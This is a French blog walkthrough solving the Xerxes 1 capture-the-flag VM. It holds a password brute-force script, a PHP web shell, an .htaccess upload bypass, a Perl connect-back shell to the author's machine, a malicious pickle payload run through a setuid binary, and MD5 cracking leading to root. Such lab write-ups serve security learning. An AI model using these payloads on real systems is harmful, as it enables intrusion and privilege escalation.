# Solution du CTF Xerxes

Intro
-----

Après le [CTF Relativity](http://devloop.users.sourceforge.net/index.php?article71/solution-du-ctf-relativity), on garde le rythme et on enchaîne avec le [Xerxes 1](http://vulnhub.com/entry/xerxes_1,58/), un autre CTF téléchargeable sur *VulnHub*.  

Cette fois pas de conversion à faire de *VM Player* vers *VirtualBox* puisque l'on a directement un fichier *.ova*.  

L'objectif est similaire à *Relativity* : obtenir le drapeau qui est */root/flag* (cette fois sans extension).  

Lancez *VirtualBox* et choisissez *"Importer une application virtuelle"* depuis le menu "Fichier" puis sélectionnez le fichier *xerxes.ova*.  

Décochez ensuite les options superflues (accès DVD, son) et cliquez sur *"Importer"*.  

Pour terminer modifiez les paramètres réseau de la VM pour passer le mode d'accès à *"Accès par pont"*. Ça y est la VM est prête à être malmenée.  

Je ne traiterais pas de l'obtention de son adresse IP déjà expliqué dans le précédent article.  

Let's go !

On démarre le système qui est une *Debian 7* avec un kernel 3.2.  

```plain
nmap -A -T4 192.168.1.39

Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-05 18:48 CET
Nmap scan report for 192.168.1.39
Host is up (0.00023s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 1024 78:63:e9:43:33:d3:80:0e:b2:83:15:26:fc:41:ea:17 (DSA)
| 2048 48:69:ae:38:d5:a1:05:e2:f5:22:45:49:35:b0:ca:5c (RSA)
|_256 14:3c:81:fb:32:dd:70:70:05:63:1a:d2:8e:ef:32:64 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 2 disallowed entries
|_/ /dev
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:39:1A:61 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.1.39

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
```

Juste deux ports ouverts : un SSH et un Apache 2.2. Au passage *Nmap* a lu le fichier *robots.txt* du site qui révèle la présence d'une url */dev*.  

La page d'index n'affiche rien de plus que la page par défaut d'installation (*It works!*) alors on passe tout de suite sur */dev*.  

![Page d'upload](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes1.png)

Il s'agit d'un ensemble de pages centrées autour d'un script d'upload. Ce dernier est protégé par mot de passe.  

On s'apperçoit vite que l'on obtient un message particulier si le fichier dépasse une certaine taille (*Error: file too large*) alors que si le fichier fait une taille correcte on tombe sur le message *"Error: you have supplied an invalid password"*.  

Je n'entre pas dans les détails mais via un script python utilisant le module requests j'ai pu déterminer que le script d'upload n'accepte pas les fichier au delà de 2000 octets.  

Pour ce qui est du champ mot de passe, il ne semble pas sensible aux injections SQL :(  

La page *"forgot password"* ne nous aide pas vraiment : pas de mécanisme pour réellement récupérer le mot de passe, seulement une image de QR code que l'on enregistre et que l'on soumet à [ZXing](http://zxing.org/w/decode.jspx) un décodeur en ligne.  

Le code QR correspond à la chaine de caractère *bG9vayBkZWVwZXI=*. On remarque le caractère égal en terminaison ce qui est caractéristique d'un encodage base64. Une fois le base64 décodé on se retrouve avec le message *"look deeper"* pas franchement encourageant.  

Pour fouiller plus profondemment, j'ai fouillé : utilisation de *stegdetect*, recherche de fichiers de backup, analyse des entêtes HTTP en jouant avec les entêtes *ETag* retournés, essai d'écraser des variables globales PHP qui aurait permis de passer une quelconque validation etc. Rien n'a aboutit.  

J'ai cru trouver la solution via la page *about.php* sur laquelle on peut lire *"This upload page is under construction and has been password-protected to prevent tampering"* alors que *about.php* n'est protégé en aucune façon : j'ai pensé que comme le site est indiqué comme étant en développement l'auteur aurait pu copier la page d'upload puis modifier son contenu pour en faire la page *about.php* en ayant retiré la protection par mot de passe (oui je suis allé chercher loin)... Mais ce n'était pas le cas (dommage j'étais content de mon idée).  

Du coup je suis passé à la méthode *Rambo* : la force brute !
J'ai écrit le script Python que voici qui teste les mots de passe issus d'un dictionnaire. Dans ce script on envoi un fichier *"test"* d'un seul octet.  

```python
import requests

fd = open("dico.txt")
i = 0

while True:
  line = fd.readline()
  if line == '':
    break
  word = line.strip()
  if i == 1000:
    print "Testing", word
    i = 0
  i = i + 1
  r = requests.post("http://192.168.1.39/dev/upload.php",
          data={'password':word},
          files={'upload_file':('test','a')})
  if "you have supplied an invalid password" in r.content:
    continue
  else:
    print "Cas particulier avec", word
    print r.content
    break

fd.close()
```

Il faut alors récupérer une bonne quantité de wordlists et prendre son temps en patiente avant de tomber sur le bon mot de passe. Finalement on obtient le sésame : *45100*.  

On écrit le fichier bd.php que voici :  

```php
<?php system($_GET["cmd"]); ?>
```

puis on l'uploade... Sauf qu'on obtient le message *"Error: illegal file detected."*. Idem avec .php3, .php5, .phtml etc.
Visiblement le script a une liste d'extensions blacklistées pour nous embêter. Et son on essayait de réécrire les directives d'Apache en uploadant un fichier *.htaccess* qui associerait une extension originale au langage PHP ?  

```python
import requests
r = requests.post("http://192.168.1.39/dev/upload.php",
        data={'password':'45100'},
        files={'upload_file':('.htaccess','AddType application/x-httpd-php .yo')})
print r.content
```

Badaboum ! Nice guy take that ! Ça passe :D  

On change l'extension de notre backdoor en *.yo* et l'upload passe nickel.  

![Backdoor PHP en action](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes2.png)

Maintenant ce serait bien d'avoir un shell, même s'il est basique. Alors on upload la backdoor Perl connect-back de *Data Cha0s* puis on la lance de cette manière :  

```plain
perl dc.pl 192.168.1.3 9999
```

Au préalable sur notre machine (192.168.1.3) au aura mis un port en écoute avec *ncat* (ou *netcat* pour les vieux :D)  

![Connect-back shell](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes3.png)

Dans les processus on remarque qu'un *Exim* tourne. Les abonnés à *Full-Disclosure* se rapellent peut être qu'un exploit avait été écrit par *KingCope* mais après avoir testé [l'exploit](http://www.securityfocus.com/bid/45341/exploit) il semble que l'on ne soit pas dans la bonne direction.  

On ne trouve rien d'intéressant dans la *crontab* ou dans les ports en écoute.  

Dans le /home on trouve 3 utilisateurs :

```plain
ls -l /home  
total 12
drwxr-xr-x 3 amanpour  amanpour  4096 Dec 19 01:15 amanpour
drwxr-x--- 3 curtiz    curtiz    4096 Dec 20 06:18 curtiz
drwxr-x--- 3 delacroix delacroix 4096 Dec 24 01:34 delacroix
```

Avec nos droits courants, seul le dossier amanpour peut nous intéresser. Voici le contenu de son dossier :

```plain
-rwxr--r-- 1 amanpour amanpour  270 Dec 19 01:28 .bash_history
-rw-r--r-- 1 amanpour amanpour  220 Dec 17 23:31 .bash_logout
-rw-r--r-- 1 amanpour amanpour 3433 Dec 19 01:27 .bashrc
-rw-r--r-- 1 amanpour amanpour  675 Dec 17 23:31 .profile
drwx------ 2 amanpour amanpour 4096 Dec 19 01:15 .ssh
-rw-r--r-- 1 amanpour amanpour 1240 Dec 18 02:53 lostpassword.png
-rw-r--r-- 1 amanpour amanpour 1220 Dec 18 02:57 newpassword
-rw-r--r-- 1 amanpour amanpour 1071 Dec 17 07:05 qr
-rw-r--r-- 1 amanpour amanpour 1235 Dec 18 02:51 steqr.py
```

Et le contenu de son historique :

```plain
file qr
python steqr.py -f qr -s hehehehe
python steqr.py -f qr-enc.png
python steqr.py -f qr -s "KysrKysrWz4rKysrKysrKzwtXT4rKysrLisuLS0tLS4tLi4="
mv qr-enc.png lostpassword.png
python steqr.py -f lostpassword.png | base64 -d
python steqr.py -f newpassword
passwd
exit
```

Le fichier *qr* est une image PNG et le fichier *steqr.py* est le script qui génère le QR code.  

A quoi correspond la chaine base64 une fois décodée ?

```plain
++++++[>++++++++<-]>++++.+.----.-..
```

Les amateurs de langages de programmation ésotériques auront tout de suite reconnu le BrainFuck. On l'entre sur [un interpréteur en ligne](http://esoteric.sange.fi/brainfuck/impl/interp/i.html) mais il s'agit en fait du mot de passe *45100* bref rien d'intéressant.  

Utilisons *steqr.py* pour savoir ce que le fichier *newpassword* recèle (je ne met pas la source car elle prendrait trop de place mais on utilise -s pour encoder et -f pour décoder) :  

```plain
python steqr.py -f newpassword
b56d9d8b6077fb56127d1c8ff84ece11
```

On entre le hash MD5 sur [MD5RDB](http://md5.noisette.ch/index.php) et on obtient *45100*... Boring !  

A tout hazard on essaye de se connecter à SSH en passant le hash comme mot de passe pour *amanpour* : on est rentré :)  

Alpinisme Unix
--------------

Maintenant qu'on a notre shell SSH voyons si on peut réaliser une escalade de privilèges. Ce cher *amanpour* fait partie d'un group baptisé *"notes"*.

```plain
amanpour@xerxes:~$ id
uid=1001(amanpour) gid=1001(amanpour) groups=1001(amanpour),1003(notes)
amanpour@xerxes:~$ grep notes /etc/group
notes:x:1003:amanpour,curtiz
```

C'est visiblement notre point d'entrée car *curtiz* en fait aussi partie. Avec une petite recherche de fichiers :

```plain
find / -group notes 2> /dev/null
```

on trouve deux fichiers appartenant à curtiz dont l'un est setuid :

```plain
-rwsr-s--x 1 curtiz notes 5111 Dec 18 05:59 /opt/notes
-rwxr-x--- 1 curtiz notes 1343 Dec 19 00:47 /opt/notes.py
```

L'exécutable *notes* est très petit et d'après ce qu'on peut voir avec un strings il ne fait qu’appeler Python sur *notes.py*. Cette fois les path apparaissent en entier.  

Le script *notes.py* est une espèce de gestionnaire de TODO-list qui exploite le module de sérialisation *Pickle*. Par défaut il tente de charger et sauver les notes dans le home de *curtiz*.  

Bien sûr il faut passer par le binaire setuid car sinon on n'accèdera pas aux notes existantes.  

![Utilisation du programme de notes](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes4.png)

Un peu au hasard on a déjà trouvé une indication qui peut nous servir pour plus tard.  

Au passage l'utilisateur n'a pas de clés SSH. L'utilsation des commandes *add* puis *save* pour tenter de créer un fichier *authorized\_keys* ne porte pas ses fruits.  

Heureusement je me suis rappelé que *Pickle* n'est pas considéré comme de confiance en terme de sérialisation. On trouve [un article très bien](http://nadiaspot.com/why-python-pickle-is-insecure/) sur le sujet qui nous explique comment on peut formater un fichier qui sera compatible *Pickle* mais provoquera une interprétation de code Python :)  

Le format est plutôt simple et on a pas besoin de spécifier quelque part la taille des chaînes (ce qui est le cas pour le bencodage utilisé par *BitTorrent* par exemple).  

![Exploitation de notes via Pickle](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes5.png)

On voit que l'on dispose de l'uid effectif de *curtiz* mais pas de son uid réel :'( Il faut donc qu'on tape juste à la première commande. On va créer une clé SSH depuis le compte *amanpour* et l'autoriser pour *curtiz* :

```plain
bash-4.2$ id
uid=1001(amanpour) gid=1001(amanpour) groups=1001(amanpour),1003(notes)
bash-4.2$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/amanpour/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/amanpour/.ssh/id_rsa.
Your public key has been saved in /home/amanpour/.ssh/id_rsa.pub.
The key fingerprint is:
bb:a2:f9:bc:0c:01:17:26:2d:56:13:8b:67:cb:a7:86 amanpour@xerxes
The key's randomart image is:
+--[ RSA 2048]----+
|  .o*.           |
|  o+.+           |
| .o.=            |
|   * .           |
|    + . S        |
|   . +   .       |
|  E +   .        |
|   . =.  .       |
|    oo=o.        |
+-----------------+
bash-4.2$ cp /home/amanpour/.ssh/id_rsa.pub /tmp/authorized_keys 
bash-4.2$ echo -e "cos\nsystem\n(S'cp /tmp/authorized_keys /home/curtiz/.ssh'\ntR." > key_trap
bash-4.2$ /opt/notes

-------------------------------
 Welcome to Juan's to-do list! 
   type help for more info     
-------------------------------
load ../../tmp/key_trap
exit
bash-4.2$ ssh curtiz@localhost
Enter passphrase for key '/home/amanpour/.ssh/id_rsa': 
Linux xerxes 3.2.0-4-486 #1 Debian 3.2.51-1 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Dec 20 06:17:11 2013 from 192.168.56.1
curtiz@xerxes:~$ id
uid=1002(curtiz) gid=1002(curtiz) groups=1002(curtiz),1003(notes)
```

Bingo ! On a grimpé d'un cran dans notre exploration :)  

La Liberté guidant le peuple
-----------------------------

Dans le home de *curtiz* on retrouve immédiatement un fichier *id\_rsa* qui correspond de toute évidence à la clé privée de *Marie* comme indiqué précédemment dans les notes que l'on a trouvé.  

Qui est *Marie* ? Un petit grep pour nous renseigner :

```plain
a.curtiz@xerxes:~$ grep -i marie /etc/passwd
delacroix:x:1000:1000:Marie Delacroix,,,:/home/delacroix:/bin/delacroix
```

Cette utilisatrice dispose d'un shell particulier : */bin/delacroix*  

Si on lance le binaire on a une demande de mot de passe. C'est le niveau de sécurité supérieure dont il était mention.  

Le binaire est lisible pour tous. *Ltrace* n'est pas installé (ce qui aurait pu faciliter l'analyse) mais de toute façon quand on lance un strings dessus on obtient :

```plain
%02x
3d054afb77714ca938d8bca104fcb141
/bin/bash
Password:
```

On retourne sur *MD5RDB* et on rentre le hash : le password complémentaire est *VonBraun*. On se connecte au compte *delacroix* en utilisant la clé :

```plain
curtiz@xerxes:~$ ssh -i id_rsa delacroix@localhost
Linux xerxes 3.2.0-4-486 #1 Debian 3.2.51-1 i686
Last login: Tue Dec 24 01:36:34 2013 from 192.168.56.1
Password: VonBraun
XERXES checking security...
delacroix@xerxes:/home/delacroix$ id
uid=1000(delacroix) gid=1000(delacroix) groups=1000(delacroix)
```

Raw Power
---------

Dans le home de l'utilisatrice, deux scripts shell : *check.sh* et *generate.sh*.  

Son historique :

```plain
whoami
id
sudo su
exit
./generate.sh 
passwd
sudo su
exit
ssh-keygen -t rsa
cd .ssh
ls -alh
cat id_rsa.pub > authorized_keys
ls -alh
chmod 700 authorized_keys 
ls -alh
exit
```

Quel est donc ce *generate.sh* lancé juste avant un sudo su ?

```bash
#!/bin/sh
touch .last && p=$(date | awk '{print $4}' | md5sum | awk '{print $1}')
echo "XERXES has generated a new password: $p"
echo "  XERXES is forever"
echo "   at your service"
```

Comme on s'y attendait c'est un programme pour générer un mot de passe. Là ou le bas blesse c'est que ce dernier est basé sur la date au moment d'exécution, date gardée par le fichier *.last* qui est mis à jour à chaque appel.  

La séquence *date | awk '{print $4}'* récupère l'heure en cours, par exemple *'18:05:26'*.  

Si on lance un *stat* sur *.last* on obtient :

```plain
  File: `.last'
  Size: 0               Blocks: 0          IO Block: 4096   regular empty file
Device: 801h/2049d      Inode: 45529       Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1000/delacroix)   Gid: ( 1000/delacroix)
Access: 2013-12-19 00:19:51.024911360 -0800
Modify: 2013-12-19 00:19:51.024911360 -0800
Change: 2013-12-19 00:19:51.024911360 -0800
  Birth: -
```

Par conséquent le mot de passe du root doit être

```plain
delacroix@xerxes:/home/delacroix$ echo 00:19:51 | md5sum | awk '{print $1}'
6cf49e97c915079e27c09d41da9d95e4
```

On se connecte via *sudo su* comme elle le faisait puis on copie le flag dans le dossier d'upload du début pour pouvoir y accéder :

```plain
delacroix@xerxes:/home/delacroix$ sudo su
[sudo] password for delacroix: 
root@xerxes:/home/delacroix# id
uid=0(root) gid=0(root) groups=0(root)
root@xerxes:/home/delacroix# file /root/flag 
/root/flag: PNG image data, 250 x 269, 8-bit/color RGB, non-interlaced
root@xerxes:/home/delacroix# cp /root/flag /var/www/
dev/        index.html  robots.txt  
root@xerxes:/home/delacroix# cp /root/flag /var/www/dev/upload/
root@xerxes:/home/delacroix# chmod o+r /var/www/dev/upload/flag
```

![Flag capturé](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes6.png)

Groovy !

*Published March 07 2014 at 06:54*